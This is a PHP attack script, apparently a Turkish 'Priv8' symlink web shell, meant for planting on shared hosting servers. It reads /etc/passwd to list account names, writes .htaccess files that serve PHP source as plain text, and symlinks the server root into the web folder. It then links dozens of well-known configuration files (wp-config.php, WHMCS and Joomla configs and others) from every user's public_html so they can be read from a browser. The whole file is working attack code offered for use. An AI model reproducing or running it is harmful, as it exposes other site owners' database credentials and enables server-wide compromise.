<?php
// etc passwd //
?>
<title>b3yaZ.ORG Symlink - Priv8</title>
<form method=post>
<textarea rows=10 cols=50 name=etcx><?php  $etcxs=file("/etc/passwd");
foreach($etcxs as $etcx)
{
$str=explode(":",$etcx);
echo $str[0]."\n";
}
?>
</textarea><br><br><input type=submit name=cek value="cek" /></form>
<?
// symlink //
error_reporting(0);
if(isset($_POST['cek']))
{
mkdir('b3yaz',0777);
$symhtaccess = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$symhtaccessx = fopen('b3yaz/.htaccess','w');
fwrite($symhtaccessx,$symhtaccess);
$b3yaz = symlink("/","b3yaz/root");
$b3yazx="<span style='color:red;'>Symlink+ tamamlandi... site.com/dizin/b3yaz/root</span>";
echo "<br>$b3yazx</>";
$dir=mkdir('b3yazx',0777);
$htaccessx =" Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$htaccess = fopen('b3yazx/.htaccess','w');
fwrite($htaccess,$htaccessx);
$config="<span style='color:red;'>Config+ tamamlandi... site.com/dizin/b3yazx</span>";
echo "<br>$config</>";
$pass=explode("\n",$_POST['etcx']);
$configyolu=array("ayar1.php","baglan.php","ayar.php","conf.php","database.php","con.php","connect.php","wp-config.php","wordpress/wp-config.php","configuration.php","blog/wp-config.php","joomla/configuration.php","vb/includes/config.php","includes/config.php","conf_global.php","inc/config.php","config.php","Settings.php","sites/default/settings.php","whm/configuration.php","whmcs/configuration.php","hosting/configuration.php","whmc/WHM/configuration.php","whm/WHMCS/configuration.php","whm/whmcs/configuration.php","support/configuration.php","clients/configuration.php","client/configuration.php","cart/configuration.php","billing/configuration.php","clientsupport/configuration.php","billing/configuration.php","admin/config.php","auto/configuration.php","db.php","database.php","inc/configuration.php","connect.php","order/configuration.php","shop/configuration.php","includes/config.php");
foreach($pass as $passx )
{
$etc=trim($passx);
foreach($configyolu as $configx)
{
$d="/home/".$etc."/public_html/".$configx;
$htaccessx="b3yazx/".$etc." .. ".$configx;
symlink($d,$htaccessx);
}
}
}
   
   
?>